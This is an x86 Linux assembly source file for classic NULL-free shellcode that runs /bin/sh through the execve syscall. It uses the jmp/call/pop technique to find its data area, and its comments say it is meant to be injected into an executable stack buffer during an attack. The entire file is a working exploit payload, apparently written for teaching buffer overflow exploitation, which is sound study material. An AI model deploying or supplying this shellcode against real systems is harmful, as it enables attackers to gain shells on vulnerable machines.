Section	.text
	global _start

_start:
	jmp	getEip			; short jump, no NULLs
doStart:
	pop	esi			; Address of "dataArea" => esi

; prepare syscall arguments
; NOTE: .text segment is readonly!!!!!!
; Hence we can not simply execute this sample to verify the syscall ...
; However, since the buffer will be on the stack, the actual attack
; still works as long as the stack is executable ...

	xor	eax, eax
	mov	byte [esi + 7], al	; 'J' => \0

	lea	ebx, [esi]
	mov	long [esi + 8], ebx	; argv[0] => '/bin/sh'
	mov	long [esi + 12], eax	; envp => NULL

	mov	byte al, 0x0b		; sys_execve
	mov	ebx, esi		; filename
	lea	ecx, [esi + 8]		; argv[]
	lea	edx, [esi + 12]		; envp[]
	int	0x80

getEip:
	call	doStart			; negative relative call, no NULLs
dataArea:
	db	'/bin/shJAAAAKKKK'
